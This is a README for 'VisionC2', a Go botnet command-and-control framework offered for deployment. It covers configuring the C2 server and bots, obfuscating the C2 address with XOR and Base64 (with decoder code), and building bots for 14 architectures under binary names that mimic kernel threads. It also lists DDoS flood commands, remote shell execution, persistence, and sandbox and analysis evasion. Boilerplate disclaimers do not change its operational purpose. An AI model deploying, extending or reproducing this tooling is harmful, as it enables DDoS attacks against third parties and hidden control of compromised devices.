# VisionC2 - Botnet Command & Control System

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

A sophisticated Go-based Command & Control (C2) framework with botnet capabilities featuring TLS encryption, multi-architecture support, and various attack vectors.

## ⚡ Features

### C2 Server Features
- **TLS Encryption**: Secure communication with bots
- **Multi-User Support**: Role-based authentication system
- **Bot Management**: Real-time bot monitoring and control
- **Attack Coordination**: Coordinate distributed attacks
- **Persistence**: Automatic reconnection and bot tracking

### Bot Features
- **Multi-Architecture**: Support for 14 different CPU architectures
- **Anti-Sandbox**: Basic sandbox detection and evasion
- **Persistence**: Multiple persistence mechanisms
- **Stealth**: Obfuscated C2 communication
- **Attack Capabilities**:
  - UDP/TCP Flood
  - HTTP Flood
  - SYN/ACK Flood
  - DNS Amplification
  - GRE Flood

### Security Features
- **Mutual Authentication**: Challenge-response authentication
- **TLS 1.2/1.3**: Modern encryption protocols
- **Connection Validation**: Bot identity verification
- **Dead Bot Cleanup**: Automatic removal of inactive bots


## 🔧 Prerequisites

### System Requirements
- **Go 1.21+** (for building from source)
- **UPX** (Ultimate Packer for eXecutables) - for binary compression
- **OpenSSL** (for certificate generation)
- **NoMoreUPX** (Reccomended custom Made tool to remove UPX strings from Anaylsis) https://github.com/Syn2Much/upx-stripper
- 
### Install Dependencies

#### Ubuntu/Debian:
```bash
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git
```

#### CentOS/RHEL:
```bash
sudo yum install -y golang upx openssl git
```

#### macOS:
```bash
brew install go upx openssl
```

## 📜 Certificate Generation Tutorial

### Step 1: Generate SSL/TLS Certificates

The C2 server requires SSL certificates for secure communication. Here's how to generate them:

#### Option A: Self-Signed Certificate (Development/Testing)

```bash
# Generate private key (2048-bit RSA)
openssl genrsa -out server.key 2048

# Generate Certificate Signing Request (CSR)
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"

# Generate self-signed certificate valid for 365 days
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt

# Set proper permissions
chmod 600 server.key
chmod 644 server.crt
```

#### Option B: Generate with Subject Alternative Names (SAN)

```bash
# Create openssl configuration file
cat > openssl.cnf <<EOF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[req_distinguished_name]
C = US
ST = State
L = City
O = Organization
CN = localhost

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = localhost
DNS.2 = 127.0.0.1
IP.1 = 127.0.0.1
EOF

# Generate private key and certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt \
  -config openssl.cnf -sha256

# Clean up
rm openssl.cnf
```

#### Option C: Using Let's Encrypt (Production)

```bash
# Install certbot
sudo apt install certbot

# Generate certificate for your domain
sudo certbot certonly --standalone -d yourdomain.com -d www.yourdomain.com

# The certificates will be stored in:
# /etc/letsencrypt/live/yourdomain.com/
#   - fullchain.pem (certificate + chain)
#   - privkey.pem (private key)

# Copy to your project directory
sudo cp /etc/letsencrypt/live/yourdomain.com/fullchain.pem server.crt
sudo cp /etc/letsencrypt/live/yourdomain.com/privkey.pem server.key
sudo chmod 644 server.crt
sudo chmod 600 server.key
```

### Step 2: Verify Certificates

```bash
# Check certificate details
openssl x509 -in server.crt -text -noout

# Check private key
openssl rsa -in server.key -check

# Test the certificate chain
openssl verify -CAfile server.crt server.crt

# Test TLS connection locally
openssl s_client -connect localhost:443 -tls1_2 -CAfile server.crt
```

## 🚀 Quick Start Guide

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/VisionC2.git
cd VisionC2
```

### 2. Configure the C2 Server

Edit `cnc/main.go` and set your server IP addresses:

```go
// Server IPs
const (
    USER_SERVER_IP = "YOUR_SERVER_IP"      // Admin interface IP
    BOT_SERVER_IP  = "YOUR_SERVER_IP"       // Bot connection IP
    USER_SERVER_PORT = "420"               // Admin port
    BOT_SERVER_PORT  = "443"               // Bot port (TLS)
)
```

Edit authentication constants:
```go
const (
    MAGIC_CODE       = "YOUR_NEW_MAGIC_CODE"      // Change per campaign
    PROTOCOL_VERSION = "v1.0"                     // Change per campaign
)
```

### 3. Configure the Bot

Edit `bot/main.go` and set your C2 server address:

```go
// Change this to your C2 server address
const gothTits = "base64plusXORencodedC2URLgoesHere"
```

Generate obfuscated C2 address using the provided tool:

```bash
cd tools
python3 obfuscate_c2.py "YOUR_C2_IP:443"
```

Copy the generated Go code and replace the `gothTits` constant and `requestMore()` function in `bot/main.go`.

### 4. Build the Bot Binaries

```bash
cd bot
chmod +x build.sh
./build.sh
```

This will create binaries for 14 different architectures in the `bins/` directory.

### 5. Generate Certificates for C2

```bash
cd ../cnc
# Generate certificates (see certificate tutorial above)
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
rm server.csr
```

### 6. Run the C2 Server

```bash
cd cnc
go run .
```

The server will automatically create a `users.json` file with a root user and display the credentials.

### 7. Connect to Admin Interface

```bash
# Using netcat
nc YOUR_SERVER_IP 420
# Or using telnet
telnet YOUR_SERVER_IP 420
```

Login with the displayed credentials.

## 🔄 C2 Address Obfuscation

The bot uses XOR+Base64 obfuscation for C2 addresses. To generate a new obfuscated address:

```bash
python3 tools/obfuscate_c2.py "1.1.1.1:443"
```

This will output:
- XOR encrypted hex value
- Base64 encoded string
- Ready-to-use Go code

Example output:
```go
const gothTits = "Bw4LDAoPAQ8PDgoLCQ8LBw=="

func requestMore() string {
    decoded, err := base64.StdEncoding.DecodeString(gothTits)
    if err != nil {
        return ""
    }
    for i := range decoded {
        decoded[i] ^= 0x55
    }
    return string(decoded)
}
```
## 🔒 Security Considerations

### Mandatory Changes Before Use
1. **Change Magic Code**: Update `MAGIC_CODE` in both `cnc/main.go` and `bot/main.go`
2. **Change Protocol Version**: Update `PROTOCOL_VERSION` for each campaign
3. **Generate New Certificates**: Never use default certificates
4. **Change Default Ports**: Modify default ports if needed
5. **Update User Credentials**: Change default root password

## 🛠️ Administration Commands

Once connected to the C2 admin interface:

### Bot Management
```
bots                     - Show connected bots
!info                    - Get bot system information
!persist                 - Setup persistence on bot
!reinstall               - Reinstall bot
!lolnogtfo               - Kill bot process
```

### Attack Commands
```
!udpflood <ip> <port> <duration>
!tcpflood <ip> <port> <duration>
!http <ip> <port> <duration>
!syn <ip> <port> <duration>
!ack <ip> <port> <duration>
!gre <ip> <port> <duration>
!dns <ip> <port> <duration>
```

### Shell Commands
```
!shell <command>         - Execute command and return output
!stream <command>        - Stream command output in real-time
!detach <command>        - Run command in background
```

### System Commands
```
clear/cls                - Clear screen
help/?                   - Show help
ongoing                  - Show active attacks
private                  - Show private commands
logout/exit              - Disconnect
db                       - Show user database
```

## 📊 Supported Architectures

The build script creates binaries for:

| Binary Name | Architecture | GOOS | GOARCH | Target Devices |
|------------|--------------|------|--------|----------------|
| kworkerd0 | x86 (386) | linux | 386 | 32-bit Intel/AMD systems |
| ethd0 | x86_64 | linux | amd64 | 64-bit Intel/AMD systems |
| mdsync1 | ARMv7 | linux | arm | ARM 32-bit v7 (Raspberry Pi 2/3) |
| ksnapd0 | ARMv5 | linux | arm | ARM 32-bit v5 (older ARM) |
| kswapd1 | ARMv6 | linux | arm | ARM 32-bit v6 (Raspberry Pi 1) |
| ip6addrd | ARM64 | linux | arm64 | ARM 64-bit (Raspberry Pi 4, Android) |
| deferwqd | MIPS | linux | mips | MIPS big-endian (routers) |
| devfreqd0 | MIPSLE | linux | mipsle | MIPS little-endian |
| kintegrity0 | MIPS64 | linux | mips64 | MIPS 64-bit big-endian |
| biosd0 | MIPS64LE | linux | mips64le | MIPS 64-bit little-endian |
| kpsmoused0 | PPC64 | linux | ppc64 | PowerPC 64-bit big-endian |
| ttmswapd | PPC64LE | linux | ppc64le | PowerPC 64-bit little-endian |
| vredisd0 | s390x | linux | s390x | IBM System/390 64-bit |
| kvmirqd | RISC-V 64 | linux | riscv64 | RISC-V 64-bit |

  
## 📁 Project Structure
```
VisionC2/
├── bot/                    # Bot client implementation
│   ├── bins/              # Compiled binaries for different architectures
│   ├── build.sh           # Multi-architecture build script
│   ├── debug.go           # Debug utilities
│   └── main.go            # Main bot logic
├── cnc/                   # Command & Control server
│   ├── main.go           # Main C2 server logic
│   ├── miscellaneous.go  # Additional utilities
│   └── users.json        # User authentication database
└── tools/
    └── obfuscate_c2.py   # C2 address obfuscation tool
```



## ⚖️ Legal & Ethical Use

By using this software, you agree to:
1. Use only for authorized security testing
2. Obtain written permission before testing any system
3. Comply with all applicable laws (CFAA, GDPR, etc.)
4. Not use for malicious purposes
5. Accept full responsibility for your actions

## 🐛 Troubleshooting

### Common Issues

1. **Certificate Errors**
   ```bash
   # Check certificate validity
   openssl verify -CAfile server.crt server.crt
   
   # Regenerate certificates if expired
   rm server.crt server.key
   # Regenerate using instructions above
   ```

2. **Build Errors**
   ```bash
   # Ensure Go is properly installed
   go version
   
   # Clean and rebuild
   go clean -modcache
   go build
   ```

3. **Connection Issues**
   ```bash
   # Check firewall rules
   sudo ufw status
   
   # Test port accessibility
   nc -zv YOUR_IP 420
   nc -zv YOUR_IP 443
   ```

4. **Permission Errors**
   ```bash
   # Set proper permissions
   chmod 600 server.key
   chmod 644 server.crt
   
   # Run as appropriate user
   sudo -u nobody ./cnc
   ```


## ⚠️ DISCLAIMER

**This project is for educational and research purposes only.**
- Only use on systems you own or have explicit permission to test
- The author is not responsible for any misuse or damage caused by this software
- Comply with all applicable laws and regulations in your jurisdiction


## 📧 Contact
dev@sinners.city
---

**Remember:** Always obtain proper authorization before testing any system. Unauthorized access to computer systems is illegal and unethical.
